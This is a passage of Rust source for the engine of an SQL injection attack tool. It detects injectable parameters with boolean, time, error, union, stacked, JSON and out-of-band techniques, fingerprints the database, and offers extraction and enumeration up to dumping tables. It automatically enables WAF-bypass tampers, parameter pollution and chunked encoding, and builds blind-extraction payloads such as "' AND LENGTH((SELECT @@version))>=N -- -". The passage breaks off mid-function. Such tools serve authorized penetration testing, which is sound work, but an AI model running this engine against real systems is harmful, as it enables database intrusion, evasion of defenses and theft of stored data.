#![deny(unsafe_code)]

use crate::{
    detection::baseline,
    error::InjektError,
    http::client::{HttpClient, RequestSpec},
    session::{
        scrubber::Scrubber,
        state::{Finding, SessionState, TechniqueKind},
    },
    target::{
        markers::MarkerSet,
        parameters::{ParameterLocation, TargetParameter},
        raw_request::RawRequest,
        url::TargetUrl,
    },
    techniques::{
        boolean::{detector::BooleanDetector, payloads::boolean_payloads_for},
        error::detector::ErrorDetector,
        json::{detector::JsonDetector, payloads::json_payloads_for},
        oob::{
            detector::OobDetector,
            payloads::{is_valid_oob_domain, new_token, oob_payloads_for},
        },
        payload_opts::{PayloadOpts, build_final_payload, encode_with_safe_chars},
        request_tamper::{hpp_body_str, hpp_query_url, should_apply_chunked},
        stacked::{detector::StackedDetector, payloads::stacked_payloads_for},
        tamper::{Tamper, tamper_transformation_sets},
        time::{detector::TimeDetector, payloads::time_payload_for},
        union::{detector::UnionDetector, payloads::union_payloads_for},
    },
};
use futures::StreamExt as _;
use http::Method;
use indicatif::{ProgressBar, ProgressStyle};
use std::{collections::HashMap, io::IsTerminal as _, sync::Arc, time::Instant};
use tokio::sync::RwLock;
use tokio_util::sync::CancellationToken;
use tracing::{info, warn};

/// Spinner hidden when stderr is not a TTY (MCP stdio, pipes, CI).
/// `indicatif` writes to stderr, so stdout JSON-RPC stays clean, but hidden
/// avoids spam + steady-tick CPU in agent mode.
fn spinner(msg: &str) -> ProgressBar {
    if !std::io::stderr().is_terminal() {
        return ProgressBar::hidden();
    }
    let pb = ProgressBar::new_spinner();
    pb.set_style(
        ProgressStyle::default_spinner()
            .template("{spinner} {msg}")
            .unwrap_or_else(|_| ProgressStyle::default_spinner()),
    );
    pb.set_message(msg.to_owned());
    pb.enable_steady_tick(std::time::Duration::from_millis(80));
    pb
}

fn progress_bar(len: u64) -> ProgressBar {
    if !std::io::stderr().is_terminal() {
        return ProgressBar::hidden();
    }
    let pb = ProgressBar::new(len);
    pb.set_style(
        ProgressStyle::default_bar()
            .template("{bar:40} {pos}/{len} {msg}")
            .unwrap_or_else(|_| ProgressStyle::default_bar()),
    );
    pb
}

/// Filter testable parameters by `-p` selection (case-insensitive).
/// Accepts bare names (`id`), `location:name` (`body:user`,
/// `cookie:PHPSESSID`, `header:X-Forwarded-For`) or full keys (`id@query`).
/// Empty filter returns all params. Marker synthetics are always preserved
/// when markers are present.
#[must_use]
pub fn filter_params(params: Vec<TargetParameter>, filter: &[String]) -> Vec<TargetParameter> {
    if filter.is_empty() {
        return params;
    }
    let lowered: Vec<String> = filter
        .iter()
        .map(|s| s.trim().to_ascii_lowercase())
        .filter(|s| !s.is_empty())
        .collect();
    if lowered.is_empty() {
        return params;
    }
    params
        .into_iter()
        .filter(|p| {
            if p.name.starts_with("marker_") {
                return true;
            }
            let name_l = p.name.to_ascii_lowercase();
            let key_l = p.key().to_ascii_lowercase();
            lowered.iter().any(|f| {
                // Bare name (`id`) or full key (`id@query`, `x@header:y`).
                if f == &name_l || f == &key_l {
                    return true;
                }
                // `location:name` form (e.g. `body:user`, `cookie:PHPSESSID`).
                let Some((loc, n)) = f.split_once(':') else {
                    return false;
                };
                match &p.location {
                    ParameterLocation::Header(h) => {
                        // `header:X-Forwarded-For` matches header params by
                        // header name; full `header:h` display also accepted.
                        loc == "header" && (name_l == n || h.to_ascii_lowercase() == n)
                    }
                    other => other.to_string().to_ascii_lowercase() == loc && name_l == n,
                }
            })
        })
        .collect()
}

/// Number of base payloads to try per technique for a tuning `--level`.
/// L1 is the historical budget (byte-identical default), L2 doubles it,
/// L3+ exhausts the whole list. Pure and unit-testable.
#[must_use]
pub fn payload_budget(level: u8, default_take: usize, total: usize) -> usize {
    match level {
        // 0 is unreachable via CLI (clap range 1..=5); treated as L1 defensively.
        0 | 1 => default_take.min(total),
        2 => (default_take * 2).min(total),
        _ => total,
    }
}

/// `--ignore-code`: a response status listed in `codes` is treated as a
/// negative probe (never a finding). The baseline (including WAF detection)
/// runs before this filter and is never ignored.
#[must_use]
pub fn is_ignored(status: u16, codes: &[u16]) -> bool {
    codes.contains(&status)
}

/// Build a synthetic raw request from `--data` so body params are preserved
/// through baseline + injection (same path as `--raw-file`).
/// Uses [`sniff_kind`] from `target::structured` for robust content-type
/// detection: checks `Content-Type` first, then falls back to body shape
/// (`{` → JSON, `<` → XML, else → urlencoded).
#[must_use]
pub fn synthetic_raw_from_data(data: &str) -> Option<RawRequest> {
    use crate::target::structured::sniff_kind;
    let trimmed = data.trim();
    if trimmed.is_empty() {
        return None;
    }
    let kind = sniff_kind(None, trimmed);
    let content_type = match kind {
        crate::target::structured::StructuredKind::Json => "application/json",
        crate::target::structured::StructuredKind::Xml => "application/xml",
        _ => "application/x-www-form-urlencoded",
    };
    let mut headers = HashMap::new();
    headers.insert("Content-Type".to_owned(), content_type.to_owned());
    Some(RawRequest {
        method: "POST".to_owned(),
        path: "/".to_owned(),
        headers,
        body: Some(trimmed.to_owned()),
        http_version: "HTTP/1.1".to_owned(),
    })
}

#[derive(Debug, Clone, PartialEq, Eq)]
#[non_exhaustive]
pub enum EngineState {
    Parse,
    Baseline,
    Detection,
    Fingerprint,
    Extraction,
    Enumeration,
    Done,
}

#[derive(Debug, Clone)]
#[non_exhaustive]
// Mirrors independent CLI flags 1:1 (see `Cli`); a state-machine/enum refactor
// would break the flat --flag command-line surface it's derived from.
#[allow(clippy::struct_excessive_bools)]
pub struct EngineConfig {
    pub threads: usize,
    pub techniques: Vec<String>,
    pub test_params: Vec<String>,
    pub post_data: Option<String>,
    pub payload_opts: crate::techniques::payload_opts::PayloadOpts,
    pub matcher: crate::detection::matcher::MatcherConfig,
    pub tampers: Vec<crate::techniques::tamper::Tamper>,
    pub level: u8,
    pub confirm: bool,
    pub ignore_codes: Vec<u16>,
    pub oob_domain: Option<String>,
    pub oob_poll_url: Option<String>,
    pub oob_wait_secs: u64,
    pub hpp: bool,
    pub chunked: bool,
    pub allow_private: bool,
    pub no_redact: bool,
    pub extract: bool,
    pub dbs: bool,
    pub tables: bool,
    pub columns: bool,
    pub dump: bool,
    pub banner: bool,
    pub current_user: bool,
    pub current_db: bool,
    pub hostname: bool,
    pub db: Option<String>,
    pub table: Option<String>,
    pub column: Option<String>,
    pub start: Option<usize>,
    pub stop: Option<usize>,
    pub count: bool,
}

/// Request-level evasion options, threaded alongside string [`Tamper`]s.
///
/// `Copy` so detection workers and extraction oracles can capture it cheaply.
#[derive(Debug, Clone, Copy, Default)]
#[non_exhaustive]
pub struct ProbeOpts {
    /// HTTP Parameter Pollution: duplicate `?id=1&id=<PAYLOAD>` (Query/Body).
    pub hpp: bool,
    /// Chunked transfer: `Transfer-Encoding: chunked` streaming body (Body only).
    pub chunked: bool,
}

impl ProbeOpts {
    #[must_use]
    pub const fn new(hpp: bool, chunked: bool) -> Self {
        Self { hpp, chunked }
    }

    #[must_use]
    pub const fn is_active(self) -> bool {
        self.hpp || self.chunked
    }

    /// Short evidence suffix, e.g. `" hpp=true chunked=false"`, or `""` when inactive.
    #[must_use]
    pub fn evidence_suffix(self) -> String {
        if !self.is_active() {
            return String::new();
        }
        format!(" hpp={} chunked={}", self.hpp, self.chunked)
    }
}

impl Default for EngineConfig {
    fn default() -> Self {
        Self {
            threads: 5,
            techniques: vec![
                "boolean".to_owned(),
                "time".to_owned(),
                "error".to_owned(),
                "union".to_owned(),
            ],
            test_params: Vec::new(),
            post_data: None,
            payload_opts: crate::techniques::payload_opts::PayloadOpts::default(),
            matcher: crate::detection::matcher::MatcherConfig::default(),
            tampers: Vec::new(),
            level: 1,
            confirm: false,
            ignore_codes: Vec::new(),
            oob_domain: None,
            oob_poll_url: None,
            oob_wait_secs: 5,
            hpp: false,
            chunked: false,
            allow_private: false,
            no_redact: false,
            extract: false,
            dbs: false,
            tables: false,
            columns: false,
            dump: false,
            banner: false,
            current_user: false,
            current_db: false,
            hostname: false,
            db: None,
            table: None,
            column: None,
            start: None,
            stop: None,
            count: false,
        }
    }
}

#[derive(Debug)]
#[non_exhaustive]
pub struct Engine {
    config: EngineConfig,
    client: HttpClient,
    state: Arc<RwLock<SessionState>>,
    cancel: CancellationToken,
    scrubber: Scrubber,
}

impl Engine {
    #[must_use]
    pub fn new(config: EngineConfig, client: HttpClient, cancel: CancellationToken) -> Self {
        let scrubber = Scrubber::new(config.no_redact);
        Self {
            config,
            client,
            state: Arc::new(RwLock::new(SessionState::new())),
            cancel,
            scrubber,
        }
    }

    #[must_use]
    pub fn state_handle(&self) -> Arc<RwLock<SessionState>> {
        Arc::clone(&self.state)
    }

    /// # Errors
    /// Returns an error if the target URL fails to parse, or a network/detection
    /// phase fails unrecoverably.
    pub async fn run(&self, target_str: &str) -> crate::error::Result<EngineState> {
        self.run_internal(target_str, None).await
    }

    /// # Errors
    /// Returns an error if the candidate URL fails to parse, or a network/detection
    /// phase fails unrecoverably.
    pub async fn run_candidate(
        &self,
        candidate: &crate::recon::ParameterCandidate,
    ) -> crate::error::Result<EngineState> {
        self.run_internal(candidate.url.as_str(), Some(candidate))
            .await
    }

    async fn run_internal(
        &self,
        target_str: &str,
        candidate: Option<&crate::recon::ParameterCandidate>,
    ) -> crate::error::Result<EngineState> {
        let mut current = EngineState::Parse;
        info!(target=%self.scrubber.scrub(target_str), state=?current, "engine start");

        // `--confirm` strict second-pass replay is not implemented yet: flag it
        // instead of silently ignoring it. In-detection 3-trial confirmation
        // (boolean/JSON channels) still applies regardless of this flag.
        if self.config.confirm {
            warn!("--confirm has no effect yet (second-pass replay not implemented)");
        }

        // Parse
        let target = TargetUrl::parse(target_str, self.config.allow_private)
            .map_err(|e| crate::error::InjektError::Other(Box::new(e)))?;
        current = EngineState::Baseline;
        info!(state=?current, "phase baseline");

        if self.cancel.is_cancelled() {
            return Ok(EngineState::Done);
        }

        let candidate_param = candidate.map(crate::recon::ParameterCandidate::target_parameter);
        let raw_request = self.build_raw_request(candidate);

        let Some((baseline, effective_tampers, effective_opts)) =
            self.collect_baseline(&target, raw_request.as_ref()).await?
        else {
            return Ok(EngineState::Done);
        };

        current = EngineState::Detection;
        info!(state=?current, "phase detection");

        let (marker_set, to_test) = self.select_params(
            target_str,
            &target,
            raw_request.as_ref(),
            candidate_param.as_ref(),
        );
        let raw_request = Arc::new(raw_request);

        self.run_detection(
            &target,
            target_str,
            &marker_set,
            &raw_request,
            &baseline,
            &effective_tampers,
            to_test,
        )
        .await;

        current = EngineState::Fingerprint;
        info!(state=?current, "phase fingerprint");
        self.run_fingerprint(
            &target,
            target_str,
            &marker_set,
            &raw_request,
            &baseline,
            &effective_tampers,
            effective_opts,
        )
        .await;

        if self.config.extract {
            current = EngineState::Extraction;
            info!(state=?current, "phase extraction — inference (opt-in)");
            self.run_extraction(
                &target,
                target_str,
                &marker_set,
                &raw_request,
                &baseline,
                &effective_tampers,
                effective_opts,
            )
            .await?;
        }

        // Enumeration phase (--dbs, --tables, --columns, --dump, --count,
        // --banner, --current-user, --current-db, --hostname)
        let needs_enum = self.config.dbs
            || self.config.tables
            || self.config.columns
            || self.config.dump
            || self.config.count
            || self.config.banner
            || self.config.current_user
            || self.config.current_db
            || self.config.hostname;
        let has_findings_for_enum = !self.state.read().await.findings().is_empty();
        if needs_enum && has_findings_for_enum {
            current = EngineState::Enumeration;
            info!(state=?current, "phase enumeration — dbs/tables/columns/dump");
            self.run_enumeration(
                &target,
                target_str,
                &marker_set,
                &raw_request,
                &baseline,
                &effective_tampers,
                effective_opts,
            )
            .await?;
        } else if needs_enum {
            warn!("enumeration requested but no confirmed vulnerability was found");
        }

        current = EngineState::Done;
        let requests = self.state.read().await.request_count();
        info!(state=?current, requests, "engine done");
        Ok(current)
    }

    /// `--data` acts as a synthetic raw request (POST) so body params flow
    /// through baseline + injection like `--raw-file`. Real raw wins on conflict.
    fn build_raw_request(
        &self,
        candidate: Option<&crate::recon::ParameterCandidate>,
    ) -> Option<RawRequest> {
        let cli_raw_request = candidate.map(crate::recon::ParameterCandidate::raw_request);
        if cli_raw_request.is_some() && self.config.post_data.is_some() {
            warn!("--raw-file and --data both set — raw request wins, --data ignored");
        }
        cli_raw_request.or_else(|| {
            let data = self.config.post_data.as_deref()?;
            let raw = synthetic_raw_from_data(data);
            if raw.is_none() && !data.is_empty() {
                warn!("--data is blank — scanning without a body");
            }
            raw
        })
    }

    /// Collects 3 baseline samples, derives the WAF-aware effective tampers/opts.
    /// `Ok(None)` means the run was cancelled with no samples collected — caller
    /// should return [`EngineState::Done`] immediately.
    async fn collect_baseline(
        &self,
        target: &TargetUrl,
        raw_request: Option<&RawRequest>,
    ) -> crate::error::Result<Option<(baseline::Baseline, Vec<Tamper>, ProbeOpts)>> {
        // Baseline: 3-5 requests (hidden when stderr is not a TTY: MCP/CI).
        let pb = spinner("collecting baseline…");

        let mut samples = Vec::new();
        for _ in 0..3 {
            if self.cancel.is_cancelled() {
                break;
            }
            let start = Instant::now();
            let spec = raw_request.map_or_else(
                || RequestSpec::get(target.as_str().to_owned()),
                |raw| request_spec_from_raw(target, raw),
            );
            let resp = self.client.send_with_retry(spec, &self.cancel).await;
            let elapsed = start.elapsed();
            match resp {
                Ok(r) => {
                    let status = r.status().as_u16();
                    let body = match self.client.read_body_with_timeout(r).await {
                        Ok(b) => b,
                        Err(e) => {
                            warn!(error=%e, "baseline body read failed");
                            Vec::new()
                        }
                    };
                    samples.push(baseline::Sample {
                        status,
                        body,
                        duration: elapsed,
                    });
                    self.state.write().await.increment_requests();
                }
                Err(e) => warn!(error=%e, "baseline request failed"),
            }
        }
        if samples.is_empty() {
            pb.finish_with_message("baseline failed");
            if self.cancel.is_cancelled() {
                return Ok(None);
            }
            return Err(crate::error::InjektError::Other(Box::new(
                std::io::Error::other(
                    "baseline failed: no successful responses from target after 3 attempts",
                ),
            )));
        }
        pb.finish_with_message("baseline done");
        let baseline = baseline::Baseline::new(&samples);
        if baseline.is_waf_blocked() {
            warn!("possible WAF detected (repeated 403/406)");
        }
        // Effective tampers: if WAF blocked and user gave none, auto-enable light bypass
        let effective_tampers: Vec<Tamper> = if baseline.is_waf_blocked()
            && self.config.tampers.is_empty()
        {
            info!(
                "WAF suspected and no --tamper given — auto-enabling space2comment for detection"
            );
            vec![Tamper::Space2Comment]
        } else {
            self.config.tampers.clone()
        };
        if !effective_tampers.is_empty() {
            info!(
                tampers=?effective_tampers.iter().map(super::super::techniques::tamper::Tamper::name).collect::<Vec<_>>(),
                "WAF tampers active"
            );
        }
        let effective_opts = ProbeOpts::new(self.config.hpp, self.config.chunked);
        if effective_opts.is_active() {
            info!(hpp=%effective_opts.hpp, chunked=%effective_opts.chunked, "request-level tampers active");
        }
        Ok(Some((baseline, effective_tampers, effective_opts)))
    }

    /// Builds the marker-synthetic + real parameter list to test, applying
    /// `-p` filtering (skipped when a recon `candidate_param` is already fixed).
    fn select_params(
        &self,
        target_str: &str,
        target: &TargetUrl,
        raw_request: Option<&RawRequest>,
        candidate_param: Option<&TargetParameter>,
    ) -> (MarkerSet, Vec<TargetParameter>) {
        let marker_set = MarkerSet::detect(target_str);
        let mut params = Vec::new();
        // Marker mode: synthetic params, but also test real query params (don't ignore them)
        if marker_set.asterisk {
            params.push(TargetParameter::new(
                "marker_asterisk",
                ParameterLocation::Query,
                "*",
            ));
        }
        if marker_set.section {
            params.push(TargetParameter::new(
                "marker_section",
                ParameterLocation::Query,
                "§",
            ));
        }
        if marker_set.double_brace {
            params.push(TargetParameter::new(
                "marker_brace",
                ParameterLocation::Query,
                "{{}}",
            ));
        }
        // Always include real query params even when markers present (fixes #6)
        params.extend(crate::target::parameters::collect_from_url_query(target));
        // Body params from --raw-file or --data (synthetic raw)
        if let Some(raw) = raw_request {
            params.extend(crate::target::parameters::collect_from_raw_request(raw));
        }
        let mut to_test: Vec<TargetParameter> = if let Some(param) = candidate_param.cloned() {
            vec![param]
        } else if params.is_empty() {
            vec![TargetParameter::new("id", ParameterLocation::Query, "1")]
        } else {
            params
        };
        // `-p` selection (candidate_param from recon always wins and skips the filter)
        if candidate_param.is_none() && !self.config.test_params.is_empty() {
            let before = to_test.len();
            to_test = filter_params(to_test, &self.config.test_params);
            if to_test.is_empty() {
                warn!(
                    filter=?self.config.test_params,
                    before,
                    "parameter filter matched 0 params — nothing to test"
                );
            } else {
                info!(filter=?self.config.test_params, before, after=%to_test.len(), "parameter filter applied");
            }
        }
        (marker_set, to_test)
    }

    /// Runs boolean/error/time/union/stacked/json/oob detection for every
    /// candidate parameter with bounded concurrency (respects `--threads`).
    // One branch per technique gated by `--techniques`; splitting further would
    // scatter the per-parameter dispatch this stream exists to keep together.
    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
    async fn run_detection(
        &self,
        target: &TargetUrl,
        target_str: &str,
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        to_test: Vec<TargetParameter>,
    ) {
        let pb2 = Arc::new(progress_bar(to_test.len() as u64));

        // Bounded concurrent testing per parameter (respects --threads)
        let concurrency = self.config.threads.clamp(1, 32);
        let target_str_owned = target_str.to_owned();
        let baseline_clone = baseline.clone();
        let target_clone = target.clone();
        let marker_set_clone = marker_set.clone();
        let raw_request = Arc::clone(raw_request);
        let effective_tampers_arc = Arc::new(effective_tampers.to_vec());

        let stream = futures::stream::iter(to_test)
            .map(|param| {
                let target = target_clone.clone();
                let target_str = target_str_owned.clone();
                let baseline = baseline_clone.clone();
                let marker_set = marker_set_clone.clone();
                let client = self.client.clone();
                let state = Arc::clone(&self.state);
                let cancel = self.cancel.clone();
                let config = self.config.clone();
                let tampers = Arc::clone(&effective_tampers_arc);
                let pb2 = Arc::clone(&pb2);
                let raw_request = Arc::clone(&raw_request);
                async move {
                    if cancel.is_cancelled() {
                        pb2.inc(1);
                        return;
                    }
                    let opts = ProbeOpts::new(config.hpp, config.chunked);
                    // Boolean with confirmation (3 trials)
                    if config
                        .techniques
                        .iter()
                        .any(|t| t == "boolean" || t == "all")
                    {
                        test_boolean_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &baseline,
                            &marker_set,
                            raw_request.as_ref().as_ref(),
                            &tampers,
                            opts,
                            &config.payload_opts,
                            &config.matcher,
                            config.level,
                            &config.ignore_codes,
                        )
                        .await;
                    }
                    if config.techniques.iter().any(|t| t == "error" || t == "all") {
                        test_error_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &marker_set,
                            raw_request.as_ref().as_ref(),
                            &tampers,
                            opts,
                            &config.payload_opts,
                            &config.matcher,
                            config.level,
                            &config.ignore_codes,
                        )
                        .await;
                    }
                    if config.techniques.iter().any(|t| t == "time" || t == "all") {
                        test_time_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &baseline,
                            &marker_set,
                            raw_request.as_ref().as_ref(),
                            &tampers,
                            opts,
                            &config.payload_opts,
                            &config.matcher,
                            config.level,
                            &config.ignore_codes,
                        )
                        .await;
                    }
                    if config.techniques.iter().any(|t| t == "union" || t == "all") {
                        test_union_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &baseline,
                            &marker_set,
                            raw_request.as_ref().as_ref(),
                            &tampers,
                            opts,
                            &config.payload_opts,
                            &config.matcher,
                            config.level,
                            &config.ignore_codes,
                        )
                        .await;
                    }
                    if config
                        .techniques
                        .iter()
                        .any(|t| t == "stacked" || t == "all")
                    {
                        test_stacked_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &baseline,
                            &marker_set,
                            raw_request.as_ref().as_ref(),
                            &tampers,
                            opts,
                            &config.payload_opts,
                            &config.matcher,
                            config.level,
                            &config.ignore_codes,
                        )
                        .await;
                    }
                    if config.techniques.iter().any(|t| t == "json" || t == "all") {
                        test_json_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &baseline,
                            &marker_set,
                            raw_request.as_ref().as_ref(),
                            &tampers,
                            opts,
                            &config.payload_opts,
                            &config.matcher,
                            config.level,
                            &config.ignore_codes,
                        )
                        .await;
                    }
                    if config.techniques.iter().any(|t| t == "oob" || t == "all") {
                        test_oob_bounded(
                            &client,
                            &state,
                            &cancel,
                            &target,
                            &target_str,
                            &param,
                            &baseline,
                            &marker_set,
                            raw_request.as_ref().as_ref(),
                            &tampers,
                            opts,
                            &config.payload_opts,
                            &config.matcher,
                            config.level,
                            &config.ignore_codes,
                            config.oob_domain.clone(),
                            config.oob_poll_url.clone(),
                            config.oob_wait_secs,
                        )
                        .await;
                    }
                    pb2.inc(1);
                }
            })
            .buffer_unordered(concurrency);

        stream.collect::<Vec<()>>().await;
        pb2.finish_with_message("detection done");
    }

    /// Passive DBMS guess from error findings + banner regex, filling any
    /// missing `dbms` on boolean/time findings.
    /// Recovers the injection point of the first confirmed finding (param
    /// name + location parsed back out of `finding.parameter`), falling back
    /// to a synthetic `id` query param when there is no finding yet. Shared
    /// by fingerprint/extraction/enumeration, which all reuse the same
    /// confirmed injection point.
    async fn first_finding_param(&self, target: &TargetUrl) -> (TargetParameter, TargetUrl) {
        let st = self.state.read().await;
        let f = st.findings().first().cloned();
        drop(st);
        if let Some(finding) = f {
            // Recover param from finding.parameter "name@location" (e.g., "id@query", "user@body", "X-Header@header:X-Header").
            // Split at the LAST '@': parameter names may contain '@' (e.g. email-like
            // query keys) while locations (`query`/`body`/`cookie`/`header:<name>`)
            // never do — HTTP header names (RFC 9110 `token`) exclude '@' and ':'.
            let (name, loc_str) = match finding.parameter.rsplit_once('@') {
                Some((n, l)) => (n.to_owned(), l.to_owned()),
                None => (finding.parameter.clone(), "query".to_owned()),
            };
            let location = if loc_str == "query" {
                ParameterLocation::Query
            } else if loc_str == "body" {
                ParameterLocation::Body
            } else if loc_str == "cookie" {
                ParameterLocation::Cookie
            } else if let Some(h) = loc_str.strip_prefix("header:") {
                ParameterLocation::Header(h.to_owned())
            } else {
                // Fallback: treat any unknown as Query, but preserve marker handling via name prefix
                ParameterLocation::Query
            };
            (TargetParameter::new(name, location, "1"), target.clone())
        } else {
            // fallback synthetic
            (
                TargetParameter::new("id", ParameterLocation::Query, "1"),
                target.clone(),
            )
        }
    }

    /// Passive DBMS guess from error findings + banner regex; if both are
    /// inconclusive, falls back to one active differential probe per
    /// candidate DBMS (see [`crate::dbms::common::DbmsDetector::fingerprint_probe`]),
    /// stopping at the first confirmation. Only runs at all when there is
    /// already a confirmed finding — no extra requests on a clean target.
    #[allow(clippy::too_many_arguments)]
    async fn run_fingerprint(
        &self,
        target: &TargetUrl,
        target_str: &str,
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        effective_opts: ProbeOpts,
    ) {
        let findings_snapshot = self.state.read().await.findings().to_vec();
        if findings_snapshot.is_empty() {
            return;
        }
        if let Some(kind) = crate::dbms::fingerprint::guess_from_findings(&findings_snapshot) {
            let mut st = self.state.write().await;
            st.fill_missing_dbms(kind);
            info!(dbms=%kind, "fingerprint guessed from findings");
            return;
        }
        // Try banner extraction from evidences
        for f in &findings_snapshot {
            if let Some((kind, ver)) = crate::dbms::fingerprint::extract_banner_version(&f.evidence)
            {
                let mut st = self.state.write().await;
                st.fill_missing_dbms(kind);
                info!(dbms=%kind, version=%ver, "fingerprint banner detected");
                return;
            }
        }
        self.active_fingerprint_probe(
            target,
            target_str,
            marker_set,
            raw_request,
            baseline,
            effective_tampers,
            effective_opts,
        )
        .await;
    }

    /// Sends one true/false probe pair per [`crate::dbms::DbmsKind`] against
    /// the confirmed injection point until one confirms via the standard
    /// boolean true/false-vs-baseline heuristic ([`BooleanDetector::evaluate`]).
    #[allow(clippy::too_many_arguments)]
    async fn active_fingerprint_probe(
        &self,
        target: &TargetUrl,
        target_str: &str,
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        effective_opts: ProbeOpts,
    ) {
        let (param, probe_target) = self.first_finding_param(target).await;
        let baseline_body = baseline.representative_body_str();
        let detector = BooleanDetector::new();
        for kind in [
            crate::dbms::DbmsKind::MySql,
            crate::dbms::DbmsKind::Postgres,
            crate::dbms::DbmsKind::MsSql,
            crate::dbms::DbmsKind::Oracle,
        ] {
            if self.cancel.is_cancelled() {
                return;
            }
            let candidate = crate::dbms::fingerprint::get_detector(kind);
            let (true_base, false_base) = candidate.fingerprint_probe();
            let true_payload =
                build_final_payload(&true_base, effective_tampers, &self.config.payload_opts);
            let false_payload =
                build_final_payload(&false_base, effective_tampers, &self.config.payload_opts);

            let true_spec = build_injection_spec_with_raw(
                &probe_target,
                target_str,
                &param,
                &true_payload,
                marker_set,
                raw_request.as_ref().as_ref(),
                effective_opts,
                &self.config.payload_opts,
            );
            let start = Instant::now();
            let true_resp = self.client.send_with_retry(true_spec, &self.cancel).await;
            let true_ms = start.elapsed().as_secs_f64() * 1000.0;
            self.state.write().await.increment_requests();
            let true_body = match true_resp {
                Ok(r) => r.text().await.unwrap_or_default(),
                Err(_) => String::new(),
            };

            if self.cancel.is_cancelled() {
                return;
            }
            let false_spec = build_injection_spec_with_raw(
                &probe_target,
                target_str,
                &param,
                &false_payload,
                marker_set,
                raw_request.as_ref().as_ref(),
                effective_opts,
                &self.config.payload_opts,
            );
            let start = Instant::now();
            let false_resp = self.client.send_with_retry(false_spec, &self.cancel).await;
            let false_ms = start.elapsed().as_secs_f64() * 1000.0;
            self.state.write().await.increment_requests();
            let false_body = match false_resp {
                Ok(r) => r.text().await.unwrap_or_default(),
                Err(_) => String::new(),
            };

            let res = detector.evaluate(
                &baseline_body,
                &true_body,
                &false_body,
                baseline.mean_ms,
                true_ms,
                false_ms,
            );
            if res.is_vulnerable && res.confidence > 0.6 {
                self.state.write().await.fill_missing_dbms(kind);
                info!(dbms=%kind, "active fingerprint confirmed");
                return;
            }
        }
    }

    /// Opt-in (`--extract`) version-string inference: length via `LENGTH()`
    /// binary search, then char-by-char `ASCII(SUBSTRING())` oracle.
    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
    async fn run_extraction(
        &self,
        target: &TargetUrl,
        target_str: &str,
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        effective_opts: ProbeOpts,
    ) -> crate::error::Result<()> {
        // Pick first finding's param as injection point for extraction
        let (first_param, target_for_extract) = self.first_finding_param(target).await;

        // Determine DBMS for extraction query
        let dbms_kind = {
            let snap = self.state.read().await.findings().to_vec();
            crate::dbms::fingerprint::guess_from_findings(&snap)
                .unwrap_or(crate::dbms::DbmsKind::MySql)
        };
        #[allow(clippy::match_same_arms)]
        let version_query = match dbms_kind {
            crate::dbms::DbmsKind::MySql => "SELECT @@version",
            crate::dbms::DbmsKind::Postgres => "SELECT version()",
            crate::dbms::DbmsKind::MsSql => "SELECT @@version",
            crate::dbms::DbmsKind::Oracle => "SELECT banner FROM v$version WHERE ROWNUM=1",
            crate::dbms::DbmsKind::Unknown => "SELECT @@version",
        };

        // Build oracle: ASCII(SUBSTRING((query), pos+1, 1)) >= mid
        let baseline_body = baseline.representative_body_str();
        let baseline_mean = baseline.mean_ms;
        let client_clone = self.client.clone();
        let state_clone = Arc::clone(&self.state);
        let cancel_clone = self.cancel.clone();
        let target_str_clone = target_str.to_owned();
        let target_clone2 = target_for_extract.clone();
        let first_param_clone = first_param.clone();
        let marker_set_clone = marker_set.clone();
        let raw_request_clone = raw_request.as_ref().clone();

        // First, infer length via LENGTH(query) if possible (try lengths 1..64)
        // Use retry per guess to mitigate single WAF/network hiccup; require 2 trials.
        let mut inferred_len: usize = 0;
        for len_guess in 1..=64usize {
            if cancel_clone.is_cancelled() {
                break;
            }
            #[allow(clippy::match_same_arms)]
            let base_payload = match dbms_kind {
                crate::dbms::DbmsKind::MySql => {
                    format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
                }
                crate::dbms::DbmsKind::Postgres => {
                    format!("' AND LENGTH(({version_query})::text)>={len_guess} --")
                }
                crate::dbms::DbmsKind::MsSql => {
                    format!("' AND LEN(({version_query}))>={len_guess} --")
                }
                crate::dbms::DbmsKind::Oracle => {
                    format!("' AND LENGTH(({version_query}))>={len_guess} --")
                }
                crate::dbms::DbmsKind::Unknown => {
                    format!("' AND LENGTH(({version_query}))>={len_guess} -- -")
                }
            };
            let payload =
                build_final_payload(&base_payload, effective_tampers, &self.config.payload_opts);
            // Retry logic: require 2 probes, treat as true only if majority true
            let mut true_count = 0usize;
            for _ in 0..2 {
                let spec = build_injection_spec_with_raw(
                    &target_clone2,
                    &target_str_clone,
                    &first_param_clone,
                    &payload,
                    &marker_set_clone,
                    raw_request_clone.as_ref(),
                    effective_opts,
                    &self.config.payload_opts,
                );
                let start = Instant::now();
                let resp = client_clone.send_with_retry(spec, &cancel_clone).await;
                let ms = start.elapsed().as_secs_f64() * 1000.0;
                state_clone.write().await.increment_requests();
                let body = match resp {
                    Ok(r) => r.text().await.unwrap_or_default(),
                    Err(_) => String::new(),
                };
                let diff = crate::detection::response_diff::diff_against_baseline(
                    &baseline_body,
                    &body,
                    baseline_mean,
                    ms,
                    100.0,
                );
                if diff.confidence < 0.4 {
                    true_count += 1;
                }
                // small jitter between retries
                if cancel_clone.is_cancelled() {
                    break;
                }
            }
            let is_true = true_count >= 1; // at least one true (tolerate single hiccup)
            // If we saw 0 true after 2 trials, length guess exceeded
            if !is_true {
                inferred_len = len_guess - 1;
                break;
            }
            if len_guess == 64 {
                inferred_len = 64;
            }
        }
        if inferred_len == 0 {
